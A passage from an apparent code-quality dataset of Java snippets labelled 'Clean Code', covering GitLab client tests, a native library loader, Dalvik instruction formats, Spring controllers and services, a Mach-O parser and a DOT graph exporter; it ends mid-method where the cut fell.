  private final AlmSettingDto almSettingDto=mock();
  @Test void testCorrectAlmReturnedForValidator(){
    GitlabValidator underTest=new GitlabValidator(gitlabClientFactory);
    assertThat(underTest.alm()).containsOnly(ALM.GITLAB);
  }
  @Test void testInvalidConfigurationExceptionThrownIfCreateClientFails(){
    GitlabValidator underTest=new GitlabValidator(gitlabClientFactory);
    when(gitlabClientFactory.createClient(any(),any())).thenThrow(new IllegalStateException(""dummy""));
    assertThatThrownBy(() -> underTest.validate(projectAlmSettingDto,almSettingDto)).isInstanceOf(InvalidConfigurationException.class).hasMessage(""Could not create Gitlab client - dummy"").has(new Condition<>(t -> ((InvalidConfigurationException)t).getScope() == InvalidConfigurationException.Scope.PROJECT,""PROJECT Scope for exception""));
  }
  @Test void testInvalidConfigurationExceptionThrownIfRetrieveProjectFails() throws IOException {
    GitlabValidator underTest=new GitlabValidator(gitlabClientFactory);
    GitlabClient gitlabClient=mock();
    when(gitlabClient.getProject(any())).thenThrow(new IllegalStateException(""dummy""));
    when(gitlabClientFactory.createClient(any(),any())).thenReturn(gitlabClient);
    assertThatThrownBy(() -> underTest.validate(projectAlmSettingDto,almSettingDto)).isInstanceOf(InvalidConfigurationException.class).hasMessage(""Project could not be retrieved from Gitlab - dummy"").has(new Condition<>(t -> ((InvalidConfigurationException)t).getScope() == InvalidConfigurationException.Scope.PROJECT,""PROJECT Scope for exception""));
  }
  @Test void testInvalidConfigurationExceptionRethrownIfCreateClientThrowsInvalidConfigurationException(){
    GitlabValidator underTest=new GitlabValidator(gitlabClientFactory);
    when(gitlabClientFactory.createClient(any(),any())).thenThrow(new InvalidConfigurationException(InvalidConfigurationException.Scope.PROJECT,""dummy""));
    assertThatThrownBy(() -> underTest.validate(projectAlmSettingDto,almSettingDto)).isInstanceOf(InvalidConfigurationException.class).hasMessage(""dummy"").has(new Condition<>(t -> ((InvalidConfigurationException)t).getScope() == InvalidConfigurationException.Scope.PROJECT,""PROJECT Scope for exception""));
  }
  @Test void testHappyPath() throws IOException {
    GitlabValidator underTest=new GitlabValidator(gitlabClientFactory);
    GitlabClient gitlabClient=mock();
    when(gitlabClient.getProject(any())).thenReturn(mock());
    when(gitlabClientFactory.createClient(any(),any())).thenReturn(gitlabClient);
    underTest.validate(projectAlmSettingDto,almSettingDto);
    verify(gitlabClient).getProject(any());
  }
}
",0,Clean Code
"/** 
 * Utilities for finding the SentencePiece binary on the System. <p>The binary will be searched for in a variety of locations in the following order: <ol> <li>In the path specified by the SENTENCEPIECE_LIBRARY_PATH environment variable <li>In a jar file location in the classpath. These jars can be created with the pytorch-native module. </ol>
 */
@SuppressWarnings(""MissingJavadocMethod"") public final class LibUtils {
  private static final Logger logger=LoggerFactory.getLogger(LibUtils.class);
  private static final String LIB_NAME=""jni_fasttext"";
  private LibUtils(){
  }
  public static void loadLibrary(){
    Ec2Utils.callHome(""fastText"");
    if (System.getProperty(""os.name"").startsWith(""Win"")) {
      throw new UnsupportedOperationException(""Windows is not supported."");
    }
    String libName=copyJniLibraryFromClasspath();
    logger.debug(""Loading fasttext library from: {}"",libName);
    System.load(libName);
  }
  private static String copyJniLibraryFromClasspath(){
    String name=System.mapLibraryName(LIB_NAME);
    Path nativeDir=Utils.getEngineCacheDir(""fasttext"");
    Platform platform=Platform.detectPlatform(""fasttext"");
    String classifier=platform.getClassifier();
    String version=platform.getVersion();
    Path path=nativeDir.resolve(version).resolve(name);
    if (Files.exists(path)) {
      return path.toAbsolutePath().toString();
    }
    Path tmp=null;
    String libPath=""native/lib/"" + classifier + ""/""+ name;
    try (InputStream is=ClassLoaderUtils.getResourceAsStream(libPath)){
      Files.createDirectories(nativeDir.resolve(version));
      tmp=Files.createTempFile(nativeDir,""jni"",""tmp"");
      Files.copy(is,tmp,StandardCopyOption.REPLACE_EXISTING);
      Utils.moveQuietly(tmp,path);
      return path.toAbsolutePath().toString();
    }
 catch (    IOException e) {
      throw new IllegalStateException(""Cannot copy jni files"",e);
    }
 finally {
      if (tmp != null) {
        Utils.deleteQuietly(tmp);
      }
    }
  }
}
",0,Clean Code
"/** 
 * Instruction format  {@code 3rc}. See the instruction format spec for details. 
 */
public final class Form3rc extends InsnFormat {
  /** 
 * {@code non-null;} unique instance of this class 
 */
  public static final InsnFormat THE_ONE=new Form3rc();
  /** 
 * Constructs an instance. This class is not publicly instantiable. Use  {@link #THE_ONE}. 
 */
  private Form3rc(){
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnArgString(  DalvInsn insn){
    return regRangeString(insn.getRegisters()) + "", "" + insn.cstString();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnCommentString(  DalvInsn insn,  boolean noteIndices){
    if (noteIndices) {
      return insn.cstComment();
    }
 else {
      return """";
    }
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int codeSize(){
    return 3;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean isCompatible(  DalvInsn insn){
    if (!(insn instanceof CstInsn)) {
      return false;
    }
    CstInsn ci=(CstInsn)insn;
    int cpi=ci.getIndex();
    Constant cst=ci.getConstant();
    if (!unsignedFitsInShort(cpi)) {
      return false;
    }
    if (!((cst instanceof CstMethodRef) || (cst instanceof CstType) || (cst instanceof CstCallSiteRef))) {
      return false;
    }
    RegisterSpecList regs=ci.getRegisters();
    int sz=regs.size();
    return (regs.size() == 0) || (isRegListSequential(regs) && unsignedFitsInShort(regs.get(0).getReg()) && unsignedFitsInByte(regs.getWordCount()));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void writeTo(  AnnotatedOutput out,  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    int cpi=((CstInsn)insn).getIndex();
    int firstReg=(regs.size() == 0) ? 0 : regs.get(0).getReg();
    int count=regs.getWordCount();
    write(out,opcodeUnit(insn,count),(short)cpi,(short)firstReg);
  }
}
",0,Clean Code
"@RestController public class HelloController {
  @GetMapping(""/test"") public void test(  HttpSession header,  HttpServletRequest request,  HttpServletResponse response,  Locale locale,  String hello){
  }
  @GetMapping(""/testreq"") public void testRequestAttribute(  @RequestAttribute String sample,  String s){
  }
  @GetMapping(value={""/employee""}) public void getEmployee(  Charset test){
  }
}
@SuppressWarnings(""rawtypes"") @RestController public class HelloController {
  @GetMapping(""/page-simple"") public Page<String> pageSimple(){
    return pageImpl(""test"");
  }
  @GetMapping(""/paged-model-simple"") public PagedModel<String> pagedModelSimple(){
    return pagedModel(""test"");
  }
  @GetMapping(""/page-complex"") public Page<Dummy<List<String>>> pageComplex(){
    return pageImpl(new Dummy<>(List.of(""test"")));
  }
  @GetMapping(""/paged-model-complex"") public PagedModel<Dummy<List<String>>> pagedModelComplex(){
    return pagedModel(new Dummy<>(List.of(""test"")));
  }
  @GetMapping(""/page-raw"") public Page pageRaw(){
    return pageSimple();
  }
  @GetMapping(""/paged-model-raw"") public PagedModel pagedModelRaw(){
    return pagedModelSimple();
  }
  private <T>PagedModel<T> pagedModel(  T value){
    return new PagedModel<>(pageImpl(value));
  }
  private <T>Page<T> pageImpl(  T value){
    return new PageImpl<>(List.of(value));
  }
}
/** 
 * The type Hello controller.
 */
@RestController class HelloController {
  /** 
 * Test.
 * @param header the header 
 * @param request the request 
 * @param response the response 
 * @param locale the locale 
 * @param hello the hello
 */
  @GetMapping(""/test"") public void test(  HttpSession header,  HttpServletRequest request,  HttpServletResponse response,  Locale locale,  String hello){
  }
  /** 
 * Test request attribute.
 * @param sample the sample 
 * @param s the s
 */
  @GetMapping(""/testreq"") public void testRequestAttribute(  @RequestAttribute String sample,  String s){
  }
}
@RestController public class HelloController {
  @GetMapping(value=""/search"",produces={""application/xml"",""application/json""}) public ResponseEntity<List<PersonDTO>> getAllPets(  @PageableDefault(size=5,sort=""name"") @ParameterObject Pageable pageable){
    return null;
  }
  @GetMapping(""/test1"") public String getPatientList1(  @PageableDefault(size=100,sort={""someField"",""someoTHER""},direction=Direction.DESC) @ParameterObject Pageable pageable){
    return ""bla"";
  }
  @GetMapping(""/test2"") public String getPatientList2(  @PageableDefault(size=100,sort=""someField"",direction=Direction.DESC) @ParameterObject Pageable pageable){
    return ""bla"";
  }
  @GetMapping(""/test3"") public String getPatientList3(  @PageableDefault(size=100) @ParameterObject Pageable pageable){
    return ""bla"";
  }
}
@RestController @RequestMapping(""/api"") public class HelloController {
  @GetMapping(""/hello"") public String hello(){
    return ""Hello"";
  }
}
",0,Clean Code
"/** 
 * 字典 业务层
 * @author AllDataDC
 */
public interface IDictDataService {
  /** 
 * 根据条件分页查询字典数据
 * @param dictData 字典数据信息
 * @return 字典数据集合信息
 */
  public List<DictData> selectDictDataList(  DictData dictData);
  /** 
 * 根据字典类型和字典键值查询字典数据信息
 * @param dictType 字典类型
 * @param dictValue 字典键值
 * @return 字典标签
 */
  public String selectDictLabel(  String dictType,  String dictValue);
  /** 
 * 根据字典数据ID查询信息
 * @param dictCode 字典数据ID
 * @return 字典数据
 */
  public DictData selectDictDataById(  Long dictCode);
  /** 
 * 批量删除字典数据
 * @param ids 需要删除的数据
 */
  public void deleteDictDataByIds(  String ids);
  /** 
 * 新增保存字典数据信息
 * @param dictData 字典数据信息
 * @return 结果
 */
  public int insertDictData(  DictData dictData);
  /** 
 * 修改保存字典数据信息
 * @param dictData 字典数据信息
 * @return 结果
 */
  public int updateDictData(  DictData dictData);
}
",0,Clean Code
"public static class LazyBindData extends KaitaiStruct {
  public static LazyBindData fromFile(  String fileName) throws IOException {
    return new LazyBindData(new ByteBufferKaitaiStream(fileName));
  }
  public LazyBindData(  KaitaiStream _io){
    this(_io,null,null);
  }
  public LazyBindData(  KaitaiStream _io,  MachO.DyldInfoCommand _parent){
    this(_io,_parent,null);
  }
  public LazyBindData(  KaitaiStream _io,  MachO.DyldInfoCommand _parent,  MachO _root){
    super(_io);
    this._parent=_parent;
    this._root=_root;
    _read();
  }
  private void _read(){
    this.items=new ArrayList<BindItem>();
{
      int i=0;
      while (!this._io.isEof()) {
        this.items.add(new BindItem(this._io,this,_root));
        i++;
      }
    }
  }
  private ArrayList<BindItem> items;
  private MachO _root;
  private MachO.DyldInfoCommand _parent;
  public ArrayList<BindItem> items(){
    return items;
  }
  public MachO _root(){
    return _root;
  }
  public MachO.DyldInfoCommand _parent(){
    return _parent;
  }
}
",0,Clean Code
"/** 
 * 本地翻译
 * @author Administrator
 * @date 2024/08/03
 */
public class LocalTranslator extends AbstractTranslator {
  private static final Logger LOGGER=Logger.getInstance(LocalTranslator.class);
  private static Map<String,String> en2ChMap;
  private static Map<String,String> ch2EnMap;
  private final Object lock=new Object();
  @Override protected String translateCh2En(  String text){
    initLocalMap();
    return ch2EnMap.getOrDefault(text,text);
  }
  @Override protected String translateEn2Ch(  String text){
    initLocalMap();
    String[] splits=text.split(StringUtils.SPACE);
    return Arrays.stream(splits).map(en2ChMap::get).filter(StringUtils::isNotBlank).collect(Collectors.joining());
  }
  private void initLocalMap(){
    if (en2ChMap != null && ch2EnMap != null) {
      return;
    }
synchronized (lock) {
      if (en2ChMap != null && ch2EnMap != null) {
        return;
      }
      try {
        String json=IOUtils.toString(ResourceUtil.getResource(getClass(),"""",""words.json""),StandardCharsets.UTF_8);
        Map<String,String> jsonMap=JSON.parseObject(json,new TypeReference<Map<String,String>>(){
        }
);
        en2ChMap=Maps.newHashMap();
        ch2EnMap=Maps.newHashMap();
        jsonMap.forEach((k,v) -> {
          en2ChMap.put(k,v);
          ch2EnMap.put(v,k);
        }
);
      }
 catch (      IOException e) {
        LOGGER.error(""Local dictionary loading failed."",e);
      }
    }
  }
}",0,Clean Code
"/** 
 * @auther macrozheng
 * @description 通配符模式消费者
 * @date 2020/5/19
 * @github https://github.com/macrozheng
 */
public class TopicReceiver {
  private static final Logger LOGGER=LoggerFactory.getLogger(TopicReceiver.class);
  @RabbitListener(queues=""#{topicQueue1.name}"") public void receive1(  String in){
    receive(in,1);
  }
  @RabbitListener(queues=""#{topicQueue2.name}"") public void receive2(  String in){
    receive(in,2);
  }
  public void receive(  String in,  int receiver){
    StopWatch watch=new StopWatch();
    watch.start();
    LOGGER.info(""instance {} [x] Received '{}'"",receiver,in);
    doWork(in);
    watch.stop();
    LOGGER.info(""instance {} [x] Done in {}s"",receiver,watch.getTotalTimeSeconds());
  }
  private void doWork(  String in){
    for (    char ch : in.toCharArray()) {
      if (ch == '.') {
        ThreadUtil.sleep(1000);
      }
    }
  }
}
",0,Clean Code
"/** 
 * Makes int sets for various parts of the optimizer.
 */
public final class SetFactory {
  /** 
 * BitIntSet/ListIntSet threshold for dominance frontier sets. These sets are kept per basic block until phi placement and tend to be, like the CFG itself, very sparse at large sizes. A value of 3072 here is somewhere around 1.125mb of total bitset size.
 */
  private static final int DOMFRONT_SET_THRESHOLD_SIZE=3072;
  /** 
 * BitIntSet/ListIntSet threshold for interference graph sets. These sets are kept per register until register allocation is done. A value of 3072 here is somewhere around 1.125mb of total bitset size.
 */
  private static final int INTERFERENCE_SET_THRESHOLD_SIZE=3072;
  /** 
 * BitIntSet/ListIntSet threshold for the live in/out sets kept by {@link SsaBasicBlock}. These are sets of SSA registers kept per basic block during register allocation. The total size of a bitset for this would be the count of blocks times the size of registers. The threshold value here is merely the register count, which is typically on the order of the block count as well.
 */
  private static final int LIVENESS_SET_THRESHOLD_SIZE=3072;
  /** 
 * Make IntSet for the dominance-frontier sets.
 * @param szBlocks {@code >=0;} count of basic blocks in method
 * @return {@code non-null;} appropriate set
 */
  static IntSet makeDomFrontSet(  int szBlocks){
    return szBlocks <= DOMFRONT_SET_THRESHOLD_SIZE ? new BitIntSet(szBlocks) : new ListIntSet();
  }
  /** 
 * Make IntSet for the interference graph sets. Public because InterferenceGraph is in another package.
 * @param countRegs {@code >=0;} count of SSA registers used in method
 * @return {@code non-null;} appropriate set
 */
  public static IntSet makeInterferenceSet(  int countRegs){
    return countRegs <= INTERFERENCE_SET_THRESHOLD_SIZE ? new BitIntSet(countRegs) : new ListIntSet();
  }
  /** 
 * Make IntSet for register live in/out sets.
 * @param countRegs {@code >=0;} count of SSA registers used in method
 * @return {@code non-null;} appropriate set
 */
  static IntSet makeLivenessSet(  int countRegs){
    return countRegs <= LIVENESS_SET_THRESHOLD_SIZE ? new BitIntSet(countRegs) : new ListIntSet();
  }
}
",0,Clean Code
"public class Graph2DotService {
  public static String dot(  Graph<AbstractGraph,Relation> graph) throws URISyntaxException {
    StringBuilder sb=new StringBuilder();
    sb.append(""digraph G {\n"");
    sb.append(""  layout=dot;\n\n"");
    sb.append(nodeAndEdges(graph,0,null));
    sb.append(""}"");
    return sb.toString();
  }
  private static String subgraph(  GraphCluster subGraph,  int level){
    StringBuilder sb=new StringBuilder();
    sb.append(indent(level)).append(""subgraph \""cluster_"").append(subGraph.getUid()).append(""\""{\n"");
    sb.append(indent(level)).append(""  label = "").append(name(subGraph)).append("";\n"");
    sb.append(nodeAndEdges(subGraph.getGraph(),level,subGraph.getUid()));
    sb.append(indent(level)).append(""}"");
    sb.append(""\n\n"");
    return sb.toString();
  }
  private static String nodeAndEdges(  Graph<AbstractGraph,Relation> graph,  int level,  String uid){
    StringBuilder sb=new StringBuilder();
    for (    AbstractGraph node : graph.nodes()) {
      if (node instanceof GraphCluster) {
        if (uid == null || !uid.equals(subGraph.getUid())) {
          sb.append(subgraph(subGraph,level + 1));
        }
      }
 else {
        sb.append(indent(level)).append(""  "").append(node(node)).append("";\n"");
      }
    }
    for (    Graph.Edge<AbstractGraph,Relation> e : graph.edges()) {
      sb.append(indent(level)).append(""  "").append(nodeName(e.getSource())).append("" -> "").append(nodeName(e.getTarget())).append("" "").append("";\n"");
    }
    return sb.toString();
  }
  private static String indent(  int level){
    return "" "".repeat(level * 2);
  }
  private static String node(  AbstractGraph node){
    return name(node) + label(node);
  }
  private static String label(  AbstractGraph node){
    String shape;
    if (node instanceof GraphClusterRoot || node instanceof GraphClusterFinally || node instanceof GraphClusterEnd) {
      shape=""point"";
    }
 else {
      shape=""box"";
    }
    return ""[shape="" + shape + ""]"";
  }
  private static String nodeName(  AbstractGraph node){
    return ""\"""" + node.getUid() + ""\"""";
  }
  private static String name(  AbstractGraph node){
    return ""\"""" + node.getUid() + ""\"""";
  }
}
",0,Clean Code
"@EnvTest public class ChunkViewerIntegrationTest {
  @ParameterizedTest @ValueSource(booleans={false,true}) public void basicJoin(  boolean sharedInstance,  Env env){
    Instance instance=env.createFlatInstance();
    if (sharedInstance) {
      var manager=env.process().instance();
      instance=manager.createSharedInstance((InstanceContainer)instance);
    }
    var chunk=instance.loadChunk(0,0).join();
    assertEquals(0,chunk.getViewers().size());
    var player=env.createPlayer(instance,new Pos(0,40,0));
    assertEquals(1,chunk.getViewers().size(),sharedInstance ? ""Chunk viewer set must include players from shared instance"" : ""Instance should have 1 viewer"");
    assertEquals(player,chunk.getViewers().iterator().next());
  }
  @Test public void renderDistance(  Env env){
    final int viewRadius=ServerFlag.CHUNK_VIEW_DISTANCE;
    final int count=ChunkRange.chunksCount(viewRadius);
    var instance=env.createFlatInstance();
    var connection=env.createConnection();
{
      var tracker=connection.trackIncoming(ChunkDataPacket.class);
      var player=connection.connect(instance,new Pos(0,40,0));
      assertEquals(instance,player.getInstance());
      assertEquals(new Pos(0,40,0),player.getPosition());
      assertEquals(count,tracker.collect().size());
    }
{
      var tracker=connection.trackIncoming(ChunkDataPacket.class);
      for (int x=-viewRadius; x <= viewRadius; x++) {
        for (int z=-viewRadius; z <= viewRadius; z++) {
          instance.getChunk(x,z).sendChunk();
        }
      }
      assertEquals(count,tracker.collect().size());
    }
  }
}
",0,Clean Code
"/** 
 * A simplified representation of a take-based  {@link NDIndex}. 
 */
public final class NDIndexFullTake {
  private NDArray indices;
  private int axis;
  /** 
 * Constructs a new  {@link NDIndexFullTake}.
 * @param indices the indices to take
 * @param axis the axis to take at
 */
  private NDIndexFullTake(  NDArray indices,  int axis){
    this.indices=indices;
    this.axis=axis;
  }
  /** 
 * Returns (if possible) the  {@link NDIndexFullTake} representation of an {@link NDIndex}.
 * @param index the index to represent
 * @param target the shape of the array to index
 * @return the full take representation or nothing if it can't represent the index
 */
  public static Optional<NDIndexFullTake> fromIndex(  NDIndex index,  Shape target){
    int axis=0;
    NDIndexFullTake fullTake=null;
    for (    NDIndexElement el : index.getIndices()) {
      if (el instanceof NDIndexAll) {
        axis++;
      }
 else       if (el instanceof NDIndexTake) {
        if (fullTake != null) {
          throw new UnsupportedOperationException(""Only one take per get is currently supported.If this is triggered by"" + "" array NDIndex: get(NDIndex array), then you should be aware of"" + "" the following changes. 1. previously this was equivalent to""+ "" .get(new NDIndex().addPickDim(array)), but now equivalent to""+ "" .take(array). So please check if you want to restore the""+ "" previous behaviour ie .get(new NDIndex().addPickDim(array)). If""+ "" so do it explicitly. 2. Check if the array index is supposed to""+ "" be boolean index. If so, remember to change the datatype of""+ "" index to boolean. Or you can explicitly do new""+ "" NDIndex().addBooleanIndex(array)"");
        }
        NDArray indexElem=((NDIndexTake)el).getIndex();
        if (!indexElem.getShape().isRankOne()) {
          throw new UnsupportedOperationException(""Only rank-1 indexing array is supported for take. If this is triggered"" + "" by array NDIndex: get(NDIndex array), then you should be aware"" + "" of the following changes. 1. previously this was equivalent to""+ "" .get(new NDIndex().addPickDim(array)), but now equivalent to""+ "" .take(array). So please check if you want to restore the""+ "" previous behaviour ie .get(new NDIndex().addPickDim(array)). If""+ "" so do it explicitly. 2. Check if the array index is supposed to""+ "" be boolean index. If so, remember to change the datatype of""+ "" index to boolean. Or you can explicitly do new""+ "" NDIndex().addBooleanIndex(array)"");
        }
        fullTake=new NDIndexFullTake(indexElem,axis);
      }
 else {
        return Optional.empty();
      }
    }
    return Optional.ofNullable(fullTake);
  }
  /** 
 * Returns the indices to take.
 * @return the indices to take
 */
  public NDArray getIndices(){
    return indices;
  }
  /** 
 * Returns the axis to take.
 * @return the axis to take
 */
  public int getAxis(){
    return axis;
  }
}
",0,Clean Code
"/** 
 * <p> 可视化看板配置信息表 服务实现类 </p>
 * @author AllDataDC
 * @date 2022-11-04
 */
@Service @Transactional(propagation=Propagation.SUPPORTS,readOnly=true,rollbackFor=Exception.class) public class BoardServiceImpl extends BaseServiceImpl<BoardDao,BoardEntity> implements BoardService {
  @Autowired private BoardDao boardDao;
  @Autowired private BoardMapper boardMapper;
  @Autowired private BoardChartDao boardChartDao;
  @Override @Transactional(rollbackFor=Exception.class) public BoardEntity saveBoard(  BoardDto boardDto){
    BoardEntity board=boardMapper.toEntity(boardDto);
    boardDao.insert(board);
    return board;
  }
  @Override @Transactional(rollbackFor=Exception.class) public BoardEntity updateBoard(  BoardDto boardDto){
    BoardEntity board=boardMapper.toEntity(boardDto);
    boardDao.updateById(board);
    return board;
  }
  @Override public BoardEntity getBoardById(  String id){
    BoardEntity boardEntity=super.getById(id);
    return boardEntity;
  }
  @Override @Transactional(rollbackFor=Exception.class) public void deleteBoardById(  String id){
    boardChartDao.delete(new QueryWrapper<BoardChartEntity>().eq(""board_id"",id));
    boardDao.deleteById(id);
  }
  @Override @Transactional(rollbackFor=Exception.class) public void deleteBoardBatch(  List<String> ids){
    for (    String id : ids) {
      deleteBoardById(id);
    }
  }
  @Override @Transactional(rollbackFor=Exception.class) public void copyBoard(  String id){
    BoardEntity boardEntity=Optional.ofNullable(super.getById(id)).orElseThrow(() -> new DataException(""获取失败""));
    BoardEntity copy=new BoardEntity();
    copy.setBoardName(boardEntity.getBoardName() + ""_副本"" + DateUtil.format(LocalDateTime.now(),DatePattern.PURE_DATETIME_PATTERN));
    copy.setBoardThumbnail(boardEntity.getBoardThumbnail());
    copy.setBoardConfig(boardEntity.getBoardConfig());
    copy.setStatus(DataConstant.EnableState.ENABLE.getKey());
    boardDao.insert(copy);
  }
  @Override @Transactional(rollbackFor=Exception.class) public void buildBoard(  BoardDto boardDto){
    BoardEntity board=boardMapper.toEntity(boardDto);
    boardDao.updateById(board);
    boardChartDao.delete(Wrappers.<BoardChartEntity>lambdaQuery().eq(BoardChartEntity::getBoardId,boardDto.getId()));
    List<BoardChartEntity> boardChartEntityList=Optional.ofNullable(board.getBoardConfig().getLayout()).orElse(new ArrayList<>()).stream().map(s -> {
      BoardChartEntity boardChartEntity=new BoardChartEntity();
      boardChartEntity.setBoardId(boardDto.getId());
      boardChartEntity.setChartId(s.getI());
      return boardChartEntity;
    }
).collect(Collectors.toList());
    boardChartDao.insertBatch(boardChartEntityList);
  }
}",0,Clean Code
"@Service public class DSSWorkspacePrivServiceImpl implements DSSWorkspacePrivService {
  @Autowired private DSSWorkspacePrivMapper dssWorkspacePrivMapper;
  @Override @Transactional(rollbackFor=Exception.class) public void updateRoleMenuPriv(  int workspaceId,  int menuId,  String updater,  List<Pair<Integer,Boolean>> pairs){
    pairs.forEach(pair -> {
      int roleId=pair.getKey();
      int priv=pair.getValue() ? 1 : 0;
      int count=dssWorkspacePrivMapper.queryCntOfMenuRolePriv(workspaceId,menuId,roleId);
      if (count >= 1) {
        dssWorkspacePrivMapper.updateRoleMenuPriv(workspaceId,menuId,roleId,priv);
      }
 else {
        dssWorkspacePrivMapper.insertMenuRolePriv(workspaceId,menuId,roleId,priv,updater);
      }
    }
);
  }
  @Override @Transactional(rollbackFor=Exception.class) public void updateRoleComponentPriv(  int workspaceId,  int appconnId,  String username,  List<Pair<Integer,Boolean>> pairs){
    pairs.forEach(pair -> {
      int roleId=pair.getKey();
      int priv=pair.getValue() ? 1 : 0;
      int count=dssWorkspacePrivMapper.queryCntOfRCP(workspaceId,appconnId,roleId);
      if (count >= 1) {
        dssWorkspacePrivMapper.updateRoleComponentPriv(workspaceId,appconnId,roleId,priv);
      }
 else {
        dssWorkspacePrivMapper.insertRolComponentPriv(workspaceId,appconnId,roleId,priv,username);
      }
    }
);
  }
  @Override public Integer getRoleId(  int workspaceId,  String key){
    return dssWorkspacePrivMapper.getRoleId(workspaceId,key);
  }
}
",0,Clean Code
"/** 
 * ERP 产品 Service 接口
 * @author 芋道源码
 */
public interface ErpProductService {
  /** 
 * 创建产品
 * @param createReqVO 创建信息
 * @return 编号
 */
  Long createProduct(  @Valid ProductSaveReqVO createReqVO);
  /** 
 * 更新产品
 * @param updateReqVO 更新信息
 */
  void updateProduct(  @Valid ProductSaveReqVO updateReqVO);
  /** 
 * 删除产品
 * @param id 编号
 */
  void deleteProduct(  Long id);
  /** 
 * 校验产品们的有效性
 * @param ids 编号数组
 * @return 产品列表
 */
  List<ErpProductDO> validProductList(  Collection<Long> ids);
  /** 
 * 获得产品
 * @param id 编号
 * @return 产品
 */
  ErpProductDO getProduct(  Long id);
  /** 
 * 获得指定状态的产品 VO 列表
 * @param status 状态
 * @return 产品 VO 列表
 */
  List<ErpProductRespVO> getProductVOListByStatus(  Integer status);
  /** 
 * 获得产品 VO 列表
 * @param ids 编号数组
 * @return 产品 VO 列表
 */
  List<ErpProductRespVO> getProductVOList(  Collection<Long> ids);
  /** 
 * 获得产品 VO Map
 * @param ids 编号数组
 * @return 产品 VO Map
 */
  default Map<Long,ErpProductRespVO> getProductVOMap(  Collection<Long> ids){
    return convertMap(getProductVOList(ids),ErpProductRespVO::getId);
  }
  /** 
 * 获得产品 VO 分页
 * @param pageReqVO 分页查询
 * @return 产品分页
 */
  PageResult<ErpProductRespVO> getProductVOPage(  ErpProductPageReqVO pageReqVO);
  /** 
 * 基于产品分类编号，获得产品数量
 * @param categoryId 产品分类编号
 * @return 产品数量
 */
  Long getProductCountByCategoryId(  Long categoryId);
  /** 
 * 基于产品单位编号，获得产品数量
 * @param unitId 产品单位编号
 * @return 产品数量
 */
  Long getProductCountByUnitId(  Long unitId);
}
",0,Clean Code
"class GitlabRestClientTest {
  private final CloseableHttpClient closeableHttpClient=mock();
  private final LinkHeaderReader linkHeaderReader=mock();
  private final ObjectMapper objectMapper=mock();
  @Test void checkErrorThrownOnNonSuccessResponseStatus() throws IOException {
    GitlabRestClient underTest=new GitlabRestClient(""http://url.test/api"",""token"",linkHeaderReader,objectMapper,() -> closeableHttpClient);
    CloseableHttpResponse closeableHttpResponse=mock();
    StatusLine statusLine=mock();
    when(statusLine.getStatusCode()).thenReturn(500);
    when(closeableHttpResponse.getStatusLine()).thenReturn(statusLine);
    when(closeableHttpClient.execute(any())).thenReturn(closeableHttpResponse);
    MergeRequestNote mergeRequestNote=mock();
    when(mergeRequestNote.getContent()).thenReturn(""note"");
    assertThatThrownBy(() -> underTest.addMergeRequestDiscussion(101,99,mergeRequestNote)).isExactlyInstanceOf(IllegalStateException.class).hasMessage(""An unexpected response code was returned from the Gitlab API - Expected: 201, Got: 500"").hasNoCause();
    ArgumentCaptor<HttpUriRequest> requestArgumentCaptor=ArgumentCaptor.captor();
    verify(closeableHttpClient).execute(requestArgumentCaptor.capture());
    HttpEntityEnclosingRequest request=(HttpEntityEnclosingRequest)requestArgumentCaptor.getValue();
    assertThat(request.getRequestLine().getMethod()).isEqualTo(""POST"");
    assertThat(request.getRequestLine().getUri()).isEqualTo(""http://url.test/api/projects/101/merge_requests/99/discussions"");
    assertThat(request.getEntity().getContent()).hasContent(""body=note"");
  }
  @Test void checkCorrectEncodingUsedOnMergeRequestDiscussion() throws IOException {
    CloseableHttpResponse closeableHttpResponse=mock();
    StatusLine statusLine=mock();
    when(statusLine.getStatusCode()).thenReturn(201);
    when(closeableHttpResponse.getStatusLine()).thenReturn(statusLine);
    HttpEntity httpEntity=mock();
    when(closeableHttpResponse.getEntity()).thenReturn(httpEntity);
    when(closeableHttpClient.execute(any())).thenReturn(closeableHttpResponse);
    MergeRequestNote mergeRequestNote=new MergeRequestNote(""Merge request note"");
    GitlabRestClient underTest=new GitlabRestClient(""http://api.url"",""token"",linkHeaderReader,objectMapper,() -> closeableHttpClient);
    underTest.addMergeRequestDiscussion(123,321,mergeRequestNote);
    ArgumentCaptor<HttpUriRequest> requestArgumentCaptor=ArgumentCaptor.captor();
    verify(closeableHttpClient).execute(requestArgumentCaptor.capture());
    HttpEntityEnclosingRequest request=(HttpEntityEnclosingRequest)requestArgumentCaptor.getValue();
    assertThat(request.getRequestLine().getMethod()).isEqualTo(""POST"");
    assertThat(request.getRequestLine().getUri()).isEqualTo(""http://api.url/projects/123/merge_requests/321/discussions"");
    assertThat(request.getEntity().getContent()).hasContent(""body=Merge+request+note"");
  }
}
",0,Clean Code
"/** 
 * @author zlt
 */
@Component(""myTransactionListener"") public class OrderTransactionListenerImpl implements TransactionListener {
  @Resource private IOrderService orderService;
  /** 
 * 提交本地事务
 */
  @Override public LocalTransactionState executeLocalTransaction(  Message message,  Object arg){
    String orderJson=new String((message.getBody()));
    Order order=JsonUtil.toObject(orderJson,Order.class);
    orderService.save(order);
    String produceError=message.getProperty(""produceError"");
    if (""1"".equals(produceError)) {
      System.err.println(""============Exception：订单进程挂了，事务消息没提交"");
      throw new RuntimeException(""============订单服务器挂了"");
    }
    return LocalTransactionState.COMMIT_MESSAGE;
  }
  /** 
 * 事务回查接口 如果事务消息一直没提交，则定时判断订单数据是否已经插入 是：提交事务消息 否：回滚事务消息
 */
  @Override public LocalTransactionState checkLocalTransaction(  MessageExt message){
    String orderId=message.getProperty(""orderId"");
    System.out.println(""============事务回查-orderId："" + orderId);
    int count=1;
    System.out.println(""============事务回查-订单已生成-提交事务消息"");
    return count > 0 ? LocalTransactionState.COMMIT_MESSAGE : LocalTransactionState.ROLLBACK_MESSAGE;
  }
}
",0,Clean Code
"public class Stack {
  private List<String> stack;
  public static final int sizeOfStack=10;
  public Stack(){
    stack=new ArrayList<>(sizeOfStack);
  }
  public boolean isEmpty(){
    return stack.size() == 0;
  }
  public String peek(){
    String t=null;
    if (stack.size() > 0)     t=stack.get(stack.size() - 1);
    return t;
  }
  /** 
 * push时需要删除旧的记录
 * @param t
 */
  public void push(  String t){
